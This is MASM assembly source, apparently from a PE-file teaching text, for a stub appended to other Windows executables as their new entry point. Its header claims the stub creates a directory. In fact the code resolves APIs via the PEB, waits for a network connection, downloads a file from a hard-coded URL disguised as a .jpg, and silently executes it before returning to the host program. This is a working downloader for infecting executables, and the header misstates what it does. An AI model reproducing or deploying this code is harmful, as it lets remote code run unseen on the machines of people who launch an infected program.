;-------------------------
; 一段附加到其他PE文件的小程序
; 本段代码使用了API函数地址动态获取以及重定位技术
; 程序功能：实现创建目录的方法
; 作者：戚利
; 开发日期：2010.6.30
;-------------------------

    .386
    .model flat,stdcall
    option casemap:none

include    windows.inc

_ProtoGetTempFileName  typedef proto :dword,:dword,:dword,:dword
_ProtoInternetOpen     typedef proto :dword,:dword,:dword,:dword,:dword
_ProtoInternetSetOption typedef proto :dword,:dword,:dword,:dword
_ProtoInternetOpenUrl  typedef proto :dword,:dword,:dword,:dword,:dword,:dword
_ProtoHttpQueryInfo    typedef proto :dword,:dword,:dword,:dword,:dword
_ProtoCreateFile   typedef proto :dword,:dword,:dword,:dword,:dword,:dword,:dword
_ProtoInternetReadFile  typedef proto :dword,:dword,:dword,:dword
_ProtoWriteFile     typedef proto :dword,:dword,:dword,:dword
_ProtoSetEndOfFile   typedef proto :dword
_ProtoCloseHandle    typedef proto :dword
_ProtoInternetCloseHandle    typedef proto :dword
_ProtoGetStartupInfo  typedef proto :dword
_ProtoCreateProcess  typedef proto :dword,:dword,:dword,:dword,:dword,\
                                   :dword,:dword,:dword,:dword,:dword
_ProtoSleep          typedef proto :dword
_ProtoInternetGetConnectedStateEx  typedef proto :dword,:dword,:dword,:dword
_ProtoGetProcAddress  typedef proto :dword,:dword
_ProtoLoadLibrary     typedef proto :dword



_ApiGetProcAddress    typedef ptr _ProtoGetProcAddress
_ApiLoadLibrary       typedef ptr _ProtoLoadLibrary
_ApiInternetGetConnectedStateEx         typedef ptr _ProtoInternetGetConnectedStateEx
_ApiSleep         typedef ptr _ProtoSleep
_ApiCreateProcess         typedef ptr _ProtoCreateProcess
_ApiGetStartupInfo         typedef ptr _ProtoGetStartupInfo
_ApiSetEndOfFile         typedef ptr _ProtoSetEndOfFile
_ApiWriteFile         typedef ptr _ProtoWriteFile
_ApiInternetReadFile         typedef ptr _ProtoInternetReadFile
_ApiCreateFile         typedef ptr _ProtoCreateFile
_ApiHttpQueryInfo         typedef ptr _ProtoHttpQueryInfo
_ApiInternetOpenUrl         typedef ptr _ProtoInternetOpenUrl
_ApiInternetSetOption         typedef ptr _ProtoInternetSetOption
_ApiInternetOpen         typedef ptr _ProtoInternetOpen
_ApiGetTempFileName         typedef ptr _ProtoGetTempFileName
_ApiCloseHandle         typedef ptr _ProtoCloseHandle
_ApiInternetCloseHandle         typedef ptr _ProtoInternetCloseHandle




;被添加到目标文件的代码从这里开始，到APPEND_CODE_END处结束

    .code

jmp _NewEntry

; 以下内容为两个重要函数名
; 几乎所有补丁都必须使用的
szGetProcAddr  db  'GetProcAddress',0
szLoadLib      db  'LoadLibraryA',0

;------------------------------------------------------
; 补丁代码中其他全局变量的定义
;------------------------------------------------------

szKernel32     db  'kernel32.dll',0,0
kernel32NDD     dd  8
szCloseHandle  db  'CloseHandle',0
szCreateFile  db  'CreateFileA',0
szCreateProcess db 'CreateProcessA',0
szGetStartupInfo db 'GetStartupInfoA',0
szGetTempFileName db 'GetTempFileNameA',0
szSetEndOfFile   db 'SetEndOfFile',0
szSleep        db 'Sleep',0
szWriteFile    db 'WriteFile',0
               align 4

hKernel32      dd  ?

kernel32IDD:  ;函数地址
_writeFile  _ApiWriteFile ?
_sleep _ApiSleep ?
_setEndOfFile   _ApiSetEndOfFile ?
_getTempFileName _ApiGetTempFileName ?
_getStartupInfo _ApiGetStartupInfo ?
_createProcess _ApiCreateProcess ?
_createFile   _ApiCreateFile ?
_closeHandle  _ApiCloseHandle ?
              dd 0

szUser32Dll    db  'user32.dll',0,0
hUser32        dd  ?

hWinInet       dd  ?
szWinInet      db  'wininet.dll',0
winInet32NDD   dd  7
szHttpQueryInfoA  db 'HttpQueryInfoA',0
szInternetCloseHandle db 'InternetCloseHandle',0
szInternetGetConnectedStateExA   db 'InternetGetConnectedStateExA',0
szInternetOpen db 'InternetOpenA',0
szInternetOpenUrl db 'InternetOpenUrlA',0
szInternetReadFile db 'InternetReadFile',0
szInternetSetOption db 'InternetSetOptionA',0
                    align 4 
winInet32IDD:  ;注意，必须与名字倒序才可以！！
_internetSetOption _ApiInternetSetOption ?
_internetReadFile _ApiInternetReadFile ?
_internetOpenUrl _ApiInternetOpenUrl ?
_internetOpen _ApiInternetOpen ?
_internetGetConnectedStateEx _ApiInternetGetConnectedStateEx ?
_internetCloseHandle _ApiInternetCloseHandle ?
_httpQueryInfo _ApiHttpQueryInfo ?
                  dd 0


lpCN           db 256 dup(0)
lpDWFlag       dd  ?
szTempPath     db '.',0
szAppName      db 'Shell',0
lpszURL        db 'http://www.sddx.gov.cn/pic/image10/cs/xxb/px/101214b-4.jpg',0
hInternet      dd ?
hInternetFile  dd ?
hThreadID      dd ?
szBuffer       db 50 dup(0)
               align 4

;-----------------------------
; 错误 Handler
;-----------------------------------------
_SEHHandler proc _lpException,_lpSEH,_lpContext,_lpDispatcher
  pushad
  mov esi,_lpException
  mov edi,_lpContext
  assume esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT
  mov eax,_lpSEH
  push [eax+0ch]
  pop [edi].regEbp
  push [eax+8]
  pop [edi].regEip
  push eax
  pop [edi].regEsp
  assume esi:nothing,edi:nothing
  popad
  mov eax,ExceptionContinueExecution
  ret
_SEHHandler endp

;------------------------------------
; 获取kernel32.dll的基地址
;------------------------------------
_getKernelBase  proc
   local @dwRet

   pushad

   assume fs:nothing
   mov eax,fs:[30h] ;获取PEB所在地址
   mov eax,[eax+0ch] ;获取PEB_LDR_DATA 结构指针
   mov esi,[eax+1ch] ;获取InInitializationOrderModuleList 链表头
   ;第一个LDR_MODULE节点InInitializationOrderModuleList成员的指针
   lodsd             ;获取双向链表当前节点后继的指针
   mov eax,[eax+8]   ;获取kernel32.dll的基地址
   mov @dwRet,eax
   popad
   mov eax,@dwRet
   ret
_getKernelBase  endp   

;-------------------------------
; 获取指定字符串的API函数的调用地址
; 入口参数：_hModule为动态链接库的基址
;           _lpApi为API函数名的首址
; 出口参数：eax为函数在虚拟地址空间中的真实地址
;-------------------------------
_getApi proc _hModule,_lpApi
   local @ret
   local @dwLen

   pushad
   mov @ret,0
   ;计算API字符串的长度，含最后的零
   mov edi,_lpApi
   mov ecx,-1
   xor al,al
   cld
   repnz scasb
   mov ecx,edi
   sub ecx,_lpApi
   mov @dwLen,ecx

   ;从pe文件头的数据目录获取导出表地址
   mov esi,_hModule
   add esi,[esi+3ch]
   assume esi:ptr IMAGE_NT_HEADERS
   mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress
   add esi,_hModule
   assume esi:ptr IMAGE_EXPORT_DIRECTORY

   ;查找符合名称的导出函数名
   mov ebx,[esi].AddressOfNames
   add ebx,_hModule
   xor edx,edx
   .repeat
     push esi
     mov edi,[ebx]
     add edi,_hModule
     mov esi,_lpApi
     mov ecx,@dwLen
     repz cmpsb
     .if ZERO?
       pop esi
       jmp @F
     .endif
     pop esi
     add ebx,4
     inc edx
   .until edx>=[esi].NumberOfNames
   jmp _ret
@@:
   ;通过API名称索引获取序号索引再获取地址索引
   sub ebx,[esi].AddressOfNames
   sub ebx,_hModule
   shr ebx,1
   add ebx,[esi].AddressOfNameOrdinals
   add ebx,_hModule
   movzx eax,word ptr [ebx]
   shl eax,2
   add eax,[esi].AddressOfFunctions
   add eax,_hModule
   
   ;从地址表得到导出函数的地址
   mov eax,[eax]
   add eax,_hModule
   mov @ret,eax

_ret:
   assume esi:nothing
   popad
   mov eax,@ret
   ret
_getApi endp

;-------------------
;获取所有函数的地址
;-------------------
_getAllApi proc _kernel,_getAddr,_loadLib
    local @dwCount
    pushad


    ;---------------------------------------------------
    ;获取WinInet.dll中引入的所有函数地址
    ;---------------------------------------------------

    ;获取动态链接库WinInet.dll的基地址
    mov eax,offset szWinInet
    add eax,ebx
    mov edx,_loadLib
    push eax
    call edx
    mov hWinInet[ebx],eax

    ;获取所有引入函数的地址
    mov esi,offset winInet32NDD
    add esi,ebx
  
    mov ecx,dword ptr [esi]  ;取出数量
    mov @dwCount,ecx
    dec @dwCount
    add esi,4
loc1:
    mov edi,offset szBuffer
    add edi,ebx

loc2:
    mov al,byte ptr [esi]
    .if al!=0
      mov byte ptr [edi],al
      inc edi
      inc esi
      jmp loc2
    .endif
    mov byte ptr [edi],0 ;szBuffer中存放了函数名称
        
    ;获取该函数地址
    mov eax,offset szBuffer
    add eax,ebx
   
    mov edx,_getAddr
    mov ecx,hWinInet[ebx]
    push eax
    push ecx
    call edx

    ;将eax函数地址放入IAT中
    pushad
    mov edi,offset winInet32IDD
    add edi,ebx

    push eax
    mov eax,@dwCount
    sal eax,2   ;eax*4
    add edi,eax
    pop eax
    mov dword ptr [edi],eax
    popad

    inc esi
    dec @dwCount
    .if @dwCount!=0FFFFFFFFh
      jmp loc1 
    .endif    

    ;---------------------------------------------------
    ;获取kernel32.dll中引入的所有函数地址
    ;---------------------------------------------------
    mov esi,offset kernel32NDD
    add esi,ebx
  
    mov ecx,dword ptr [esi]  ;取出数量
    mov @dwCount,ecx
    add esi,4
loc3:
    mov edi,offset szBuffer
    add edi,ebx

loc4:
    mov al,byte ptr [esi]
    .if al!=0
      mov byte ptr [edi],al
      inc edi
      inc esi
      jmp loc4
    .endif
    mov byte ptr [edi],0 ;szBuffer中存放了函数名称
        
    ;获取该函数地址
    mov eax,offset szBuffer
    add eax,ebx
   
    mov edx,_getAddr
    mov ecx,_kernel
    push eax
    push ecx
    call edx

    ;将eax函数地址放入IAT中
    pushad
    mov edi,offset kernel32IDD
    add edi,ebx

    push eax
    mov eax,@dwCount
    dec eax
    sal eax,2   ;eax*4
    add edi,eax
    pop eax
    mov dword ptr [edi],eax
    popad

    inc esi
    dec @dwCount
    .if @dwCount!=0
      jmp loc3 
    .endif    

    popad
    ret
_getAllApi endp

;-----------------------
; 线程函数，下载并运行
; 参数_lpURL指向要下载的文件
;-----------------------
_downAndRun proc _lpURL  
  local @szFileName[256]:byte
  local @dwBuffer,@dwNumberOfBytesWritten,@dwBytesToWrite
  local @lpBuffer[200h]:byte
  local @hFile
  local @stStartupInfo:STARTUPINFO  
  local @stProcessInformation:PROCESS_INFORMATION  

  lea edx,@szFileName
  push edx
  push 0
  push NULL
  mov edx,offset szTempPath
  add edx,ebx
  push edx

  mov edx,_getTempFileName[ebx]
  call edx

  push 0
  push NULL
  push NULL
  push INTERNET_OPEN_TYPE_PRECONFIG
  mov edx,offset szAppName
  add edx,ebx
  push edx
  mov edx,_internetOpen[ebx]
  call edx
  .if eax!=NULL
    
    mov hInternet[ebx],eax

    ;设置连接超时值和接收超时值
    push 4
    lea edx,@dwBuffer
    push edx
    push INTERNET_OPTION_CONNECT_TIMEOUT
    mov edx,hInternet[ebx]
    push edx
    mov edx,_internetSetOption[ebx]
    call edx

    push 4
    lea edx,@dwBuffer
    push edx
    push INTERNET_OPTION_CONTROL_RECEIVE_TIMEOUT
    mov edx,hInternet[ebx]
    push edx
    mov edx,_internetSetOption[ebx]
    call edx

    ;用当前参数打开URL
    push 0
    push INTERNET_FLAG_EXISTING_CONNECT
    push NULL
    push NULL
    push _lpURL
    mov edx,hInternet[ebx]
    push edx
    mov edx,_internetOpenUrl[ebx]
    call edx

    .if eax!=NULL
      mov hInternetFile[ebx],eax
      mov @dwNumberOfBytesWritten,200h
      ;读HTTP文件头

      push 0
     
      lea edx,@dwNumberOfBytesWritten
      push edx
      lea edx,@lpBuffer
      push edx

      push HTTP_QUERY_STATUS_CODE
      mov edx,hInternetFile[ebx]
      push edx
      mov edx,_httpQueryInfo[ebx]
      call edx

      .if eax!=NULL

         ;打开临时文件准备写
         push 0
         push 0
         push OPEN_ALWAYS
         push NULL
         push 0
         push GENERIC_WRITE
         lea edx,@szFileName
         push edx
         mov edx,_createFile[ebx]
         call edx

         .if eax != 0FFFFFFFFh
           mov @hFile,eax
           .while TRUE
             mov @dwBytesToWrite,0
             ;读网络文件数据
             lea edx,@dwBytesToWrite
             push edx
             push 200h
             lea edx,@lpBuffer
             push edx
             mov edx,hInternetFile[ebx]
             push edx
             mov edx,_internetReadFile[ebx]
             call edx
             .break .if (!eax)
             .break .if (@dwBytesToWrite==0)
             ;写入文件

             push 0
             lea edx,@dwNumberOfBytesWritten
             push edx
             push @dwBytesToWrite
             lea edx,@lpBuffer
             push edx
             push @hFile
             mov edx,_writeFile[ebx]
             call edx
           .endw
           push @hFile
           mov edx,_setEndOfFile[ebx]
           call edx
           push @hFile
           mov edx,_closeHandle[ebx]
           call edx
         .endif
      .endif
      mov edx,hInternetFile[ebx]
      push edx
      mov edx,_internetCloseHandle[ebx]
      call edx
    .endif
      mov edx,hInternet[ebx]
      push edx
      mov edx,_internetCloseHandle[ebx]
      call edx
  .endif
 
  ;运行下载的文件
  lea edx,@stStartupInfo
  push edx
  mov edx,_getStartupInfo[ebx]
  call edx

  lea edx,@stProcessInformation 
  push edx
  lea edx,@stStartupInfo
  push edx
  push NULL
  push NULL
  push NORMAL_PRIORITY_CLASS
  push FALSE
  push NULL
  push NULL
  lea edx,@szFileName
  push edx
  push NULL
  mov edx,_createProcess[ebx]
  call edx
  .if eax==0
    push @stProcessInformation.hThread
    mov edx,_closeHandle[ebx]
    call edx

    push @stProcessInformation.hProcess
    mov edx,_closeHandle[ebx]
    call edx
  .endif  
  ret  
_downAndRun endp       

;------------------------
; 补丁功能部分
; 传入三个参数：
;      _kernel:kernel32.dll的基地址
;      _getAddr:函数GetProcAddress地址
;      _loadLib:函数LoadLibraryA地址
;------------------------
_patchFun  proc _kernel,_getAddr,_loadLib

    ;------------------------------------------------------
    ; 补丁功能代码局部变量定义
    ;------------------------------------------------------
    pushad
    ;测试网络是否连通
    .while TRUE
      push 1000
      mov edx,_sleep[ebx] ;睡眠1秒
      call edx

      push 0
      push 256
      mov edx,offset lpCN
      add edx,ebx
      push edx
      mov edx,offset lpDWFlag
      add edx,ebx
      push edx

      mov edx,_internetGetConnectedStateEx[ebx]
      call edx
      .break .if eax
    .endw
    mov edx,offset lpszURL
    add edx,ebx
    push edx
    mov edx,offset _downAndRun
    add edx,ebx
    call edx

    popad
    ret
_patchFun  endp

_start  proc
    local hKernel32Base:dword  ;存放kernel32.dll基址

    local _getProcAddress:_ApiGetProcAddress  ;定义函数
    local _loadLibrary:_ApiLoadLibrary

    pushad

    ;获取kernel32.dll的基地址
    lea edx,_getKernelBase
    add edx,ebx
    call edx
    mov hKernel32Base,eax

    ;从基地址出发搜索GetProcAddress函数的首址
    mov eax,offset szGetProcAddr
    add eax,ebx

    mov edi,hKernel32Base
    mov ecx,edi
    lea edx,_getApi
    add edx,ebx

    push eax
    push ecx
    call edx
    mov _getProcAddress,eax

    ;从基地址出发搜索LoadLibraryA函数的首址
    mov eax,offset szLoadLib
    add eax,ebx

    mov edi,hKernel32Base
    mov ecx,edi
    lea edx,_getApi
    add edx,ebx

    push eax
    push ecx
    call edx
    mov _loadLibrary,eax

    ;获取所有函数的地址
    lea edx,_getAllApi
    add edx,ebx

    push _loadLibrary
    push _getProcAddress
    push hKernel32Base
    call edx

    ;调用补丁代码
    lea edx,_patchFun
    add edx,ebx

    push _loadLibrary
    push _getProcAddress
    push hKernel32Base
    call edx

    popad
    ret
_start  endp

; EXE文件新的入口地址

_NewEntry:
    call @F   ; 免去重定位
@@:
    pop ebx
    sub ebx,offset @B

    invoke _start
    jmpToStart   db 0E9h,0F0h,0FFh,0FFh,0FFh
    ret
    end _NewEntry